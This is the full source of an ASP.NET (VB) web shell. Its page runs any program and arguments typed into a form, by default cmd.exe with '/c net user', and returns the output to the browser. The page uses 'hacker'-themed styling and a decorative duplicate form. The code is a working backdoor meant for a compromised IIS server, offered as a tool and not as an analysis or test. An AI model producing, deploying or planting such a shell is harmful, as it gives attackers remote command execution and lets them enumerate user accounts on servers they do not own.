<%@ Page Language="VB" Debug="true" %>
<%@ import Namespace="system.IO" %>
<%@ import Namespace="System.Diagnostics" %>

<script runat="server">      

Sub RunCmd(Src As Object, E As EventArgs)            
  Dim myProcess As New Process()            
  Dim myProcessStartInfo As New ProcessStartInfo(xpath.text)            
  myProcessStartInfo.UseShellExecute = false            
  myProcessStartInfo.RedirectStandardOutput = true            
  myProcess.StartInfo = myProcessStartInfo            
  myProcessStartInfo.Arguments=xcmd.text            
  myProcess.Start()            

  Dim myStreamReader As StreamReader = myProcess.StandardOutput            
  Dim myString As String = myStreamReader.Readtoend()            
  myProcess.Close()            
  mystring=replace(mystring,"<","&lt;")            
  mystring=replace(mystring,">","&gt;")            
  result.text= vbcrlf & "<pre>" & mystring & "</pre>"    
End Sub

</script>

<html>
  <head>
    <style type="text/css">
			body{
				background-image: url("data:image/svg+xml,%3Csvg version='1.1' id='Layer_1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x='0px' y='0px' viewBox='0 0 1024 768' style='enable-background:new 0 0 1024 768;' xml:space='preserve'%3E%3Cimage style='overflow:visible;' width='1920' height='1477' xlink:href='hacker-3342696_1920.jpg' transform='matrix(1 0 0 1 -448 -355)'%3E%3C/image%3E%3C/svg%3E");
				background-size: cover;
				background-repeat: repeat-y;
				height: auto;
				font-family: lato;
			}
			.hack-form{
				width: 500px;
				max-width: 600px;
				background-color:rgba(9, 146, 32, .7);
				position: fixed;
  				top: 50%;
  				left: 50%;
  				transform: translate(-50%, -50%);
  				padding: 30px;
  				border: 1px solid #fff;
  				border-radius: 5px;
			}
			.frm-grp{
				width: 100%;
				display: block;
			}
			.lbl-clr{
				color: #fff;
				font-size: 16px;
			}
			.hack-frm-cntrl{
				width: 100%;
				height: 35px;
				background-color: rgba(255, 255, 255, .8);
				border: none;
				margin: 10px 0px;
				border-radius: 5px;
			}
			.hack-frm-cntrl::placeholder{
				color: #000;	
			}
			::-webkit-file-upload-button {
  				background: #000;
  				color: #fff;
  				padding: 10px;
  				border: none;
  				font-weight: bold;
			 }
			 .hcg-btn{
			 	background-color: #fff;
			 	color: #099220;
			 	border: none;
			 	padding: 10px 40px;
			 	border-radius: 5px;
			 	font-size: 14px;
			 	font-weight: 600;
			 	margin-top: 10px;
			 }
			 .hcg-btn:hover{
			 	background-color: #000;
			 	color: #fff;
			 }
		</style>
  </head>
<body>    
<form runat="server">        
<p><asp:Label id="L_p" runat="server" width="80px">Program</asp:Label>        
<asp:TextBox id="xpath" runat="server" Width="300px">c:\windows\system32\cmd.exe</asp:TextBox>        
<p><asp:Label id="L_a" runat="server" width="80px">Arguments</asp:Label>        
<asp:TextBox id="xcmd" runat="server" Width="300px" Text="/c net user">/c net user</asp:TextBox>        
<p><asp:Button id="Button" onclick="runcmd" runat="server" Width="100px" Text="Run"></asp:Button>        
<p><asp:Label id="result" runat="server"></asp:Label>   
  <div class="hack-form">
			<div class="frm-grp">
				<label class="lbl-clr">Program</label>
				<input type="url" name="url" class="hack-frm-cntrl" placeholder="url">
			</div>
			<div class="frm-grp">
				<label class="lbl-clr">Arguments</label>
				<input type="url" name="url" class="hack-frm-cntrl" placeholder="url">
			</div>
			<!--<div class="frm-grp">
				<label class="lbl-clr">File</label>
				<input type="File" name="file" class="hack-frm-cntrl">
			</div> -->
			<div class="frm-grp" style="text-align: center;">
				<button class="hcg-btn">Run</button>
			</div>
		</div>
</form>
</body>
</html>
